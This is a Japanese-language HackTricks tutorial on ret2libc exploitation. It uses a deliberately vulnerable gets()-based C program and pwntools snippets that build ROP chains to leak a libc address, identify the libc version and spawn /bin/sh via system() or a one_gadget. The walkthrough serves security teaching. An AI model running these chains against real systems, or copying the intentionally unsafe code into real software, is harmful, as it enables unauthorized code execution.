# ROPを使用したlibcアドレスの漏洩

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。**

</details>
{% endhint %}

## 簡単な要約

1. **オーバーフローのオフセットを見つける**
2. **`POP_RDI`ガジェット、`PUTS_PLT`、および`MAIN`を見つける**
3. 前のガジェットを使用して**putsまたは他のlibc関数のメモリアドレスを漏洩させ、**libcのバージョンを**見つける**（[ダウンロードする](https://libc.blukat.me)）
4. ライブラリを使用して、**ROPを計算し、エクスプロイトする**

## 実践用の他のチュートリアルとバイナリ

このチュートリアルは、次のチュートリアルで提案されたコード/バイナリをエクスプロイトします：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
他の有用なチュートリアル：[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)、[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## コード

ファイル名：`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBCのリークテンプレート

私はここにあるコードを使ってエクスプロイトを作成します。\
エクスプロイトをダウンロードし、脆弱なバイナリと同じディレクトリに配置し、スクリプトに必要なデータを提供してください：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- オフセットの特定

テンプレートはエクスプロイトを続行する前にオフセットが必要です。提供された場合は、必要なコードを実行してそれを見つけます（デフォルトでは `OFFSET = ""`）：
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**実行** `python template.py` すると、クラッシュしたプログラムとともに **GDBコンソール** が開きます。その **GDBコンソール** 内で `x/wx $rsp` を実行して、RIPを上書きする予定だった **バイト** を取得します。最後に、**python** コンソールを使用して **オフセット** を取得します:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

オフセット（この場合は40）を見つけたら、その値を使ってテンプレート内のOFFSET変数を変更します。\
`OFFSET = "A" * 40`

別の方法としては、`pattern create 1000` -- _retまで実行_ -- `pattern seach $rsp`をGEFから使用することです。

## 2- ガジェットの発見

次に、バイナリ内でROPガジェットを見つける必要があります。このROPガジェットは、**libc**を見つけるために`puts`を呼び出すのに役立ち、後で**最終的なエクスプロイトを実行する**ために使用されます。
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` は **function puts** を呼び出すために必要です。\
`MAIN_PLT` は **exploit** を **again** 行うために、1回のインタラクションの後に **main function** を再度呼び出すために必要です（無限のエクスプロイトのラウンド）。**各 ROP の最後でプログラムを再度呼び出すために使用されます**。\
**POP\_RDI** は呼び出された関数に **parameter** を **pass** するために必要です。

このステップでは、実行中に pwntools によってすべてが見つかるため、何も実行する必要はありません。

## 3- libc ライブラリの特定

今はどのバージョンの **libc** ライブラリが使用されているかを見つける時です。そうするために、**function** `puts` のメモリ内の **address** を **leak** し、そのアドレスにある puts バージョンがどの **library version** にあるかを **search** します。
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
これを行うために、実行されたコードの最も重要な行は次のとおりです：
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
これは、**RIP**を**上書きする**ことが可能になるまでいくつかのバイトを送信します: `OFFSET`。\
次に、**アドレス**を`POP_RDI`のガジェットに設定し、次のアドレス（`FUNC_GOT`）が**RDI**レジスタに保存されるようにします。これは、**putsを呼び出す**ために、`PUTS_GOT`の**アドレス**を渡したいからです。puts関数のメモリ内のアドレスは`PUTS_GOT`が指すアドレスに保存されています。\
その後、`PUTS_PLT`が呼び出され（**RDI**内に`PUTS_GOT`がある状態で）、putsは`PUTS_GOT`内の**内容を読み取ります**（**メモリ内のputs関数のアドレス**）そしてそれを**出力します**。\
最後に、**main関数が再度呼び出され**、再びオーバーフローを利用できるようになります。

この方法で、**puts関数を騙して**、**メモリ内の**関数**putsのアドレス**（**libc**ライブラリ内）を**出力させました**。今、そのアドレスがあるので、**どのlibcバージョンが使用されているかを検索できます**。

![](<../../../../../.gitbook/assets/image (141).png>)

**ローカル**バイナリを**利用している**ため、どのバージョンの**libc**が使用されているかを特定する必要はありません（ただ`/lib/x86_64-linux-gnu/libc.so.6`でライブラリを見つければよいです）。\
しかし、リモートエクスプロイトの場合、どのようにそれを見つけるかをここで説明します：

### 3.1- libcバージョンの検索 (1)

ウェブページでどのライブラリが使用されているかを検索できます: [https://libc.blukat.me/](https://libc.blukat.me)\
これにより、発見された**libc**のバージョンをダウンロードすることもできます。

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- libcバージョンの検索 (2)

次のようにすることもできます：

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

これには少し時間がかかりますので、辛抱してください。\
これが機能するためには、次が必要です：

* Libcシンボル名: `puts`
* 漏洩したlibcアドレス: `0x7ff629878690`

これにより、最も可能性の高い**libc**を特定できます。
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
私たちは2つの一致を得ます（最初のものが機能しない場合は2番目のものを試してください）。最初のものをダウンロードしてください：
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` から libc を作業ディレクトリにコピーします。

### 3.3- 漏洩させる他の関数
```python
puts
printf
__libc_start_main
read
gets
```
## 4- libcアドレスの発見とエクスプロイト

この時点で、使用されているlibcライブラリを知っている必要があります。ローカルバイナリをエクスプロイトしているので、私は次のようにします:`/lib/x86_64-linux-gnu/libc.so.6`

したがって、`template.py`の最初で**libc**変数を次のように変更します: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #ライブラリパスを知っているときに設定する`

**libcライブラリ**への**パス**を指定することで、残りの**エクスプロイトは自動的に計算されます**。

`get_addr`関数内で**libcのベースアドレス**が計算されます:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
注意してください、**最終的なlibcベースアドレスは00で終わる必要があります**。そうでない場合は、間違ったライブラリを漏洩した可能性があります。
{% endhint %}

次に、関数`system`のアドレスと文字列_"/bin/sh"_の**アドレス**は、**libc**の**ベースアドレス**から**計算**され、**libcライブラリ**が与えられます。
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
最後に、/bin/sh 実行のエクスプロイトが準備されます。
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
この最終ROPについて説明しましょう。\
最後のROP（`rop1`）は再びmain関数を呼び出しましたので、再度**overflow**を**exploit**できます（だから`OFFSET`がここに再びあります）。次に、**"/bin/sh"**の**アドレス**（`BINSH`）を指す`POP_RDI`を呼び出し、**system**関数（`SYSTEM`）を呼び出します。**"/bin/sh"**のアドレスがパラメータとして渡されるからです。\
最後に、**exit関数のアドレス**が**呼び出され**、プロセスが**きれいに終了**し、アラートが生成されません。

**この方法で、exploitは\_/bin/sh**\_\*\*シェルを実行します。*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- ONE\_GADGETの使用

**system**と**"/bin/sh"**を使用する代わりに、[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)を使用してシェルを取得することもできます。**ONE\_GADGET**はlibcライブラリ内で、1つの**ROPアドレス**を使用してシェルを取得する方法を見つけます。\
ただし、通常はいくつかの制約があり、最も一般的で回避しやすいものは`[rsp+0x30] == NULL`です。**RSP**内の値を制御しているので、制約を回避するためにもう少しNULL値を送信するだけです。

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

この脆弱性を悪用するためのテンプレートはここにあります：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Common problems

### MAIN\_PLT = elf.symbols\['main'] が見つかりません

"main" シンボルが存在しない場合、メインコードの場所を見つけることができます：
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
アドレスを手動で設定します:
```python
MAIN_PLT = 0x401080
```
### Putsが見つかりません

バイナリがPutsを使用していない場合は、次のことを確認してください。

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

すべてのエクスプロイトを作成した後にこの**エラー**が表示される場合: `sh: 1: %s%s%s%s%s%s%s%s: not found`

**"/bin/sh"のアドレスから64バイトを引いてみてください**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**

</details>
{% endhint %}
